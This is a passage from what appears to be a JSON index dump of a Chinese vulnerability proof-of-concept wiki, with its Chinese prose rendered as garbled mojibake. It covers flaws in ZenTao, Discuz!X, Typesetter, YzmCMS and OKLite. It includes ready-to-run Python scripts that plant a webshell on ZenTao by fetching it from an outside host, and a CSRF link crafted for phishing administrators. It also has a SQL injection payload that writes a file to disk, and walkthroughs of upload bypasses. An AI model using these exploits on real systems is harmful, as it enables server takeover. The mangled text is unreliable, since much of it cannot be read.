{}/api-getModel-api-getMethod-filePath=/tmp/test/1/ æŸ¥çœ‹ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] è¯»å–phpæ–‡ä»¶å¤±è´¥ \\033[0m\") except: print(\"\\033[31m[x] è¯»å–phpæ–‡ä»¶å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, zentaosid) POC_3(target_url, zentaosid) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325.html","title":"ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325","keywords":"","body":"ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325 æ¼æ´æè¿° ç™¾åº¦äº‘å®‰å…¨å›¢é˜Ÿç›‘æµ‹åˆ°ç¦…é“å®˜æ–¹å‘å¸ƒäº†æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„é£é™©é€šå‘Šï¼Œè¯¥æ¼æ´ç¼–å·ä¸ºCNVD-C-2020-121325ï¼Œæ¼æ´å½±å“ç¦…é“ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ ç¯å¢ƒæ­å»º ç™¾åº¦ä¸‹12.4.2çš„ç¦…é“ç¯å¢ƒæŒ‰æ­¥éª¤å®‰è£…ä¸‹è½½å³å¯ ç¦…é“å®˜æ–¹ç½‘ç«™ è°ƒç”¨æ¥å£æŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯ http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig æ¼æ´å¤ç° [!NOTE] æ¼æ´è§¦å‘éœ€è¦åå°æƒé™ æ ¹æ®æ¼æ´æè¿°æŸ¥çœ‹ä¿®æ”¹åçš„ä»£ç ç‰‡æ®µ ä¿®æ”¹å‰ public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } ä¿®æ”¹å public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this->config->file->allowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } è¿™é‡Œä¼ å…¥çš„å‚æ•°ä¸ºç‰ˆæœ¬å’Œlinkåœ°å€ï¼Œç„¶åbase64è§£ç ï¼Œæ­£åˆ™åˆ¤æ–­æ˜¯å¦ä¸ºhttpæˆ–httpsåè®®ï¼Œè¿™é‡Œçš„æ­£åˆ™è¿‡æ»¤å¹¶ä¸å®Œæ•´ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ç”¨äºä¸‹è½½æ¶æ„æ–‡ä»¶ å¯ä»¥å¤§å†™httpæˆ–è¯·æ±‚FTPæ¥ç»•è¿‡æ­£åˆ™ è·Ÿè¿›ä¸€ä¸‹parent::downloadZipPackageè¿™ä¸ªæ–¹æ³•ï¼Œè·Ÿç€æ¥åˆ°zentao\\module\\client\\model.phpæ–‡ä»¶ä¸­ public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this->app->wwwRoot . $dir)) { mkdir($this->app->wwwRoot . $dir, 0755, true); } if(!is_dir($this->app->wwwRoot . $dir)) return false; if(file_exists($this->app->wwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this->app->wwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } å¯ä»¥ç®€å•çœ‹åˆ°è¿™é‡Œè·å–linkä¼ å…¥çš„æ–‡ä»¶åï¼Œé€šè¿‡fopenæ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå†™å…¥ç¦…é“ç›®å½•www/data/client/versionä¸­ æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„åœ°æ–¹ æ‰¾åˆ°äº†downloadæ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªæ¼æ´ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ä¸¤ç§ä¸‹è½½æ¶æ„æ–‡ä»¶çš„æ–¹æ³• http://xxx.xxx.xxx.xxx/www/client-download-[$versionå‚æ•°]-[base64åŠ å¯†åçš„æ¶æ„æ–‡ä»¶åœ°å€].html http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$versionå‚æ•°]&link=[base64åŠ å¯†åçš„æ¶æ„æ–‡ä»¶åœ°å€] é¦–å…ˆå…ˆä¸Šä¼ ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯FTPä¹Ÿå¯ä»¥æ˜¯HTTP ä¾‹å¦‚æˆ‘ä¸Šä¼ çš„æ–‡ä»¶URLä¸ºhttp://peiqi.tech/SHELL.php http://peiqi.tech/SHELL.php | base64åŠ å¯† HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw è¯·æ±‚åœ°å€åˆ™ä¸º http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw ä¸‹è½½çš„ç›®å½•åœ°å€ä¸ºzentaopms\\www\\data\\client\\1 [!NOTE] ç›®å½•ä¸ºversionåç§° æˆåŠŸä¸Šä¼ webshell æ¼æ´åˆ©ç”¨POC [!NOTE] POCä½¿ç”¨éœ€è¦æ‹¥æœ‰åå°Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: zentao version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mShell >>> http://xxx.xxx.xxx.xxx/shell.php(æ¶æ„æ–‡ä»¶åœ°å€) \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookieå­—æ®µ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] ç¦…é“ç‰ˆæœ¬ä¸º:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] è·å–ç‰ˆæœ¬å¤±è´¥ \\033[0m\", e) def POC_2(target_url, shell_url, zentaosid): options = shell_url.split(\"://\") if options[0] == \"http\": shell_url = \"HTTP://\" + options[1] elif options[0] == \"ftp\": shell_url = \"ftp://\" + options[1] else: print(\"\\033[31m[x] è¯·ä½¿ç”¨æ­£ç¡®çš„è¯·æ±‚åœ°å€ \\033[0m\") sys.exit(0) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"zentaosid={}\".format(zentaosid) } shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8') vuln_url = target_url + \"/www/index.php?m=client&f=download&version=test&link={}\".format(shell_url_base) print(\"\\033[32m[o] è¯·æ±‚æ¼æ´urlï¼š{}\\033[0m\".format(vuln_url)) try: response = requests.get(url=vuln_url, timeout=20, headers=headers) if \"ä¿å­˜æˆåŠŸ\" in response.text: print(\"\\033[32m[o] æˆåŠŸå†™å…¥Webshellï¼ŒURLåœ°å€ä¸ºï¼š{}/www/data/client/test/Webshell_name.php\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] æ¶æ„æ–‡ä»¶ä¸‹è½½å¤±è´¥ \\033[0m\") except: print(\"\\033[31m[x] æ¶æ„æ–‡ä»¶ä¸‹è½½å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) shell_url = str(input(\"\\033[35mShell >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, shell_url, zentaosid) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552.html","title":"ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552","keywords":"","body":"ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ æ¼æ´æè¿° å¯ä»¥é’ˆå¯¹ç¦…é“çš„éƒ¨åˆ†æ¨¡å—åˆ¶é€ æ¶æ„URLåœ°å€å‘é€ç»™ç®¡ç†å‘˜ï¼Œå½“ç®¡ç†å‘˜ç™»å½•æ—¶ä¼šæ‰§è¡Œæ¨¡å—çš„æ¶æ„è¯·æ±‚,å¯ç”¨äºè¿›è¡Œé’“é±¼è¯·æ±‚ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ ç¯å¢ƒæ­å»º ç™¾åº¦ä¸‹12.4.2çš„ç¦…é“ç¯å¢ƒæŒ‰æ­¥éª¤å®‰è£…ä¸‹è½½å³å¯ ç¦…é“å®˜æ–¹ç½‘ç«™ è°ƒç”¨æ¥å£æŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯ http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig æ¼æ´å¤ç° è¿™é‡Œåˆ©ç”¨ ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325(å¯å‚ç…§ä¸Šä¸€ç¯‡æ–‡ç« ) æ¥æ„é€ ä¸€ä¸ªæ¶æ„çš„URLåœ°å€ æŸ¥çœ‹module/common/model.phpçš„checkPrivæ–¹æ³• public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if($this->app->isFlow) { $module = $this->app->rawModule; $method = $this->app->rawMethod; } if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!defined('IN_UPGRADE')) $this->session->user->view = $this->loadModel('user')->grantUserView(); $this->app->user = $this->session->user; if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } è¿™é‡Œçš„ä»£ç ç‰‡æ®µä¸ºé‰´æƒå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æœ€åä¸€å¥ä»£ç  $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); æ‰€ä»¥å½“è°ƒç”¨å½“å‰æƒé™ä¸å…è®¸çš„æ–¹æ³•æ—¶ï¼Œä¼šè¿›è¡Œè·³è½¬ï¼Œå¹¶åœ¨$refererå‚æ•°ç¼“å­˜è°ƒç”¨çš„æ–¹æ³•URLï¼Œå½“ä½¿ç”¨è¿™ä¸ªè·³è½¬çš„åœ°å€ç™»å½•æ—¶åˆ™ä¼šç›´æ¥è°ƒç”¨æ­¤æ–¹æ³• URLåœ°å€æ„é€ è¿‡ç¨‹ http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=HTTP://peiqi.tech/SHELL.php å°†linkå‚æ•°base64åŠ å¯† http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw å°†refererå‚æ•°ä»¥ . åšåˆ†å‰²base64åŠ å¯†ä¸¤è¾¹å­—ç¬¦ http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA.bT1jbGllbnQmZj1kb3dubG9hZCZ2ZXJzaW9uPTEmbGluaz1TRlJVVURvdkwzQmxhWEZwTG5SbFkyZ3ZVMGhGVEV3dWNHaHc= å°†è¿™ä¸ªURLåœ°å€å‘é€ç»™ç®¡ç†å‘˜ï¼Œå½“ç®¡ç†å‘˜ç™»å½•æ—¶åˆ™ä¼šè§¦å‘æ¶æ„æ–‡ä»¶ä¸‹è½½ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/Discuz!X/":{"url":"PeiQi_Wiki/CMSæ¼æ´/Discuz!X/","title":"Discuz!X","keywords":"","body":"Discuz!X Discuz!X WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/Discuz!X/Discuz!X å°äº3.4 R20191201 åå°SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/Discuz!X/Discuz!X å°äº3.4 R20191201 åå°SQLæ³¨å…¥æ¼æ´.html","title":"Discuz!X <3.4 R20191201 åå°SQLæ³¨å…¥æ¼æ´","keywords":"","body":"Discuz!X æ¼æ´æè¿° ä¸ä¹…ä»¥å‰Discuz!Xçš„åå°æŠ«éœ²äº†ä¸€ä¸ªsqlæ³¨å…¥çš„æ¼æ´ï¼Œè¿™é‡Œä¹Ÿè¦æ„Ÿè°¢æ¼æ´çš„å‘ç°å’Œç ”ç©¶è€…ï¼ˆæ— ç³–çš„kn1f3)ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Discuz!X ç¯å¢ƒæ­å»º ç™¾åº¦äº‘ç›˜ä¸‹è½½é“¾æ¥ å¯†ç : 0515 å°† uploadç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·å…¥phpstudyä¸‹çš„WWWç›®å½•æ‰“å¼€ç½‘ç«™æŒ‰ç…§æ­¥éª¤å®‰è£…å°±è¡Œäº† æ¼æ´å¤ç° æ¥åˆ°åå°é¡µé¢, åœ¨ UCenter åº”ç”¨ ID ä½ç½®çš„å‚æ•°æ·»åŠ å•å¼•å·å¹¶æŠ“åŒ… å‘ç°å‡ºç°SQLè¯­å¥æŠ¥é”™ ä½¿ç”¨æŠ¥é”™æ³¨å…¥å»è·å–ç‰ˆæœ¬å· è¿™é‡Œçš„å‚æ•°ä¸º settingnew[uc][appid] æŸ¥çœ‹æ–‡ä»¶ \\source\\admincp\\admincp_setting.phpï¼Œ åœ¨2677è¡Œæ‰¾åˆ°äº†è¾“å…¥ç‚¹ æ ¹æ®æŠ¥é”™è¯­å¥æ‰¾åˆ°SQLè¯­å¥æ‰§è¡Œç‚¹ï¼Œåœ¨æ–‡ä»¶uc_client\\model\\base.php ä¸­çš„ 206è¡Œ é€šè¿‡è¿™é‡Œçš„è¯­å¥å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ unionæ³¨å…¥ çš„æ–¹æ³•æ¥å†™å…¥æ¶æ„æ–‡ä»¶(secure_file_privä¸èƒ½ä¸ºNull) 1' union select \"\" into outfile 'D:/peiqi.php';--+ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ–¹æ³• WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/Typesetter/":{"url":"PeiQi_Wiki/CMSæ¼æ´/Typesetter/","title":"Typesetter","keywords":"","body":"Typesetter Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼  WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/Typesetter/Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/CMSæ¼æ´/Typesetter/Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´æè¿° å¯ä»¥é€šè¿‡å°†.phpæ”¾åœ¨.zipæ–‡ä»¶ä¸­å¹¶è§£å‹ç¼©æ¥ç»•è¿‡å¯¹.phpæ–‡ä»¶çš„ä¿æŠ¤ã€‚ä¸€æ—¦å®Œæˆï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„çš„phpæ–‡ä»¶ï¼ˆwebshellï¼‰åœ¨è®¡ç®—æœºä¸Šæ‰§è¡Œå‘½ä»¤ å½±å“ç‰ˆæœ¬ [!NOTE] Typesetter CMS 5-5.1 æ¼æ´å¤ç° æŒ‰å¦‚ä¸‹æ­¥éª¤å¤ç° å‚è€ƒæ–‡ç«  Github ç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/YzmCMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/YzmCMS/","title":"YzmCMS","keywords":"","body":"YzmCMS YzmCMS Version å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/YzmCMS/YzmCMS Version  å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/YzmCMS/YzmCMS Version  å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´.html","title":"YzmCMS Version  å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´","keywords":"","body":"YzmCMS version æ¼æ´æè¿° YzmCMSå†…å®¹ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€æ¬¾è½»é‡çº§å¼€æºå†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå®ƒé‡‡ç”¨è‡ªä¸»ç ”å‘çš„æ¡†æ¶YZMPHPå¼€å‘ã€‚ç¨‹åºåŸºäºPHP+Mysqlæ¶æ„ï¼Œå¹¶é‡‡ç”¨MVCæ¡†æ¶å¼å¼€å‘çš„ä¸€æ¬¾é«˜æ•ˆå¼€æºçš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå¯è¿è¡Œåœ¨Linuxã€Windowsã€MacOSXã€Solarisç­‰å„ç§å¹³å°ä¸Šã€‚ æºç å­˜åœ¨åè®®è¯†åˆ«çš„ç¼ºé™·ï¼Œå¯¼è‡´å­˜åœ¨SSRFæ¼æ´ æ¼æ´å½±å“ [!NOTE] YzmCMS version ç¯å¢ƒæ­å»º https://github.com/yzmcms/yzmcms æŒ‰ç…§æ–‡æ¡£å®‰è£…å³å¯ æ¼æ´å¤ç° ç™»å½•åå° --> æ¨¡å—ç®¡ç† --> é‡‡é›†ç®¡ç† æ·»åŠ é‡‡é›†è§„åˆ™ åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šç¼–è¾‘HTMLä»£ç  [!NOTE] æ ¹ç›®å½•å¯èƒ½ä¸åŒï¼Œpayloadéœ€è¦æ›´æ”¹ ç‚¹å‡»é‡‡é›†è¯»å–æ ¹ç›®å½•ä¸‹çš„ Flag å‡ºç°æ¼æ´çš„ä»£ç ä½ç½® yzmcms/yzmphp/core/class/cache_factory.class.php è¿™é‡Œè°ƒç”¨ url_check å‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡Œåªæ£€æµ‹äº†å‰4ä½æ˜¯å¦ä¸º httpï¼Œä½¿ç”¨ httpxxx å³å¯ç»•è¿‡ å‚è€ƒæ–‡ç«  There are SSRF vulnerabilities in background collection management WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/OKLite/":{"url":"PeiQi_Wiki/CMSæ¼æ´/OKLite/","title":"OKLite","keywords":"","body":"OKLite OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131 OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼  OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131.html","title":"OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131","keywords":"","body":"OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131 æ¼æ´æè¿° OKLite v1.2.25 åå°æ¨¡å—å¯¼å…¥è¿‡æ»¤ä¸å®Œå–„å¯¼è‡´å¯ä»¥ä¸Šä¼ æ¶æ„æœ¨é©¬æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] OKLite 1.2.25 æ¼æ´å¤ç° é¦–å…ˆè¦å…ˆæ¸…æ¥šå®ƒçš„æ‰§è¡Œæµç¨‹ æŸ¥çœ‹æ–‡ä»¶ framework/init.php åœ¨å¾€ä¸‹é¢çœ‹å¯ä»¥çœ‹åˆ°æ‰§è¡Œå‡½æ•°çš„é€»è¾‘ ä¾‹å¦‚ http://127.0.0.1/admin.php?c=ABC&f=EFG åˆ™æ˜¯è°ƒç”¨ framework\\admin\\ABC_control.phpä¸­çš„EFG_fæ–¹æ³• çœ‹åˆ°åœ¨åå°æœ‰ä¸€ä¸ª ZIP æ–‡ä»¶ä¸Šä¼ çš„å‡½æ•°ï¼Œæ‰¾ä¸€ä¸‹ä¸Šä¼ ZIPæ–‡ä»¶çš„ä½ç½® æ¨¡å—ç®¡ç† --> æ¨¡å—å¯¼å…¥ å›å¤´çœ‹ä¸‹å‡½æ•°æ–¹æ³•çš„è°ƒç”¨ public function zipfile($input,$folder='') { if(!$input){ return array('status'=>'error','content'=>P_Lang('æœªæŒ‡å®šè¡¨å•åç§°')); } //å¦‚æœæœªæŒ‡å®šå­˜å‚¨æ–‡ä»¶å¤¹ï¼Œåˆ™ä½¿ç”¨ if(!$folder){ $folder = 'data/cache/'; } $this->cateid = 0; $this->set_dir($folder); $this->set_type('zip'); $this->cate = array('id'=>0,'filemax'=>104857600,'root'=>$folder,'folder'=>'/','filetypes'=>'zip'); if(isset($_FILES[$input])){ $rs = $this->_upload($input); }else{ $rs = $this->_save($input); } if($rs['status'] != 'ok'){ return $rs; } $rs['cate'] = $this->cate; return $rs; } è¿™é‡Œçš„ ä¸Šä¼ ç›®å½•é»˜è®¤ä¸º data/cache è¿™ä¸ªç›®å½•ï¼Œå¹¶è°ƒç”¨äº†ä¸¤ä¸ªæ–¹æ³• _upload å’Œ _save å¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®å¯¹ä¸Šä¼ çš„zipå¹¶æ²¡æœ‰å¯¹é‡Œé¢çš„æ–‡ä»¶æœ‰ä»€ä¹ˆè¿‡æ»¤,ä»»æ„ä¸Šä¼ ä¸€ä¸ªZIPæ–‡ä»¶æŠ“åŒ… test.phpæ–‡ä»¶å†…å®¹ å¦‚ä¸‹ï¼Œæ‰“åŒ…ä¸º test.zip ä¸Šä¼  å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨çš„æ–¹æ³•æ˜¯ upload_controlä¸­çš„ zip æ–¹æ³• è¿™é‡Œæ”¾åŒ…åå‘ç°è°ƒç”¨äº†å¦ä¸€ä¸ªæ–¹æ³•ï¼Œè·Ÿè¸ªä¸‹ä»£ç  framework/admin/module_control.php ä¸­çš„ import_fæ–¹æ³• è¿™é‡Œçš„æ–¹æ³•ä¸ºè§£å‹æ–¹æ³•ï¼Œè¯´æ˜ZIPæ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ä¸º æ¨¡å—ä¸Šä¼  --> ZIPæ–‡ä»¶å†™å…¥ data/cache --> è§£å‹åˆšåˆšçš„ZIPæ–‡ä»¶åˆ° data/cache ç›®å½• æ‰€ä»¥è¿™é‡Œçš„æµç¨‹å®Œå…¨æ˜¯æ²¡æœ‰è¿‡æ»¤å±é™©æ–‡ä»¶çš„ï¼Œå°†ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶æ‰“åŒ…ä¸ºZIPæ–‡ä»¶ä¸Šä¼ è®¿é—®å³å¯ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´æè¿° OKLite v1.2.25 åå°æ’ä»¶è¿‡æ»¤ä¸å®Œå–„å¯¼è‡´å¯ä»¥ä¸Šä¼ æ¶æ„æœ¨é©¬æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] OKLite 1.2.25 æ¼æ´å¤ç° å…³äºæ‰§è¡Œé€»è¾‘å‚ç…§ä¸Šä¸€ç¯‡ OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131 å‡ºç°æ¼æ´çš„ä½ç½®åœ¨äºframework/admin/plugin_control.php public function unzip_f() { $id = $this->get('id','int'); $rs = $this->model('res')->get_one($id); if(!$rs){ $this->json(P_Lang('é™„ä»¶ä¸å­˜åœ¨')); } if($rs['ext'] != 'zip'){ $this->json(P_Lang('éZIPæ–‡ä»¶ä¸æ”¯æŒåœ¨çº¿è§£å‹')); } if(!file_exists($this->dir_root.$rs['filename'])){ $this->json(P_Lang('æ–‡ä»¶ä¸å­˜åœ¨')); } $info = $this->lib('phpzip')->zip_info($this->dir_root.$rs['filename']); $info = current($info); if(!$info['filename']){ $this->json(P_Lang('æ’ä»¶æœ‰å¼‚å¸¸')); } $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('æ’ä»¶æœ‰å¼‚å¸¸')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('æ’ä»¶å·²å­˜åœ¨ï¼Œä¸å…è®¸é‡å¤è§£å‹')); } if(!$info[1]){ 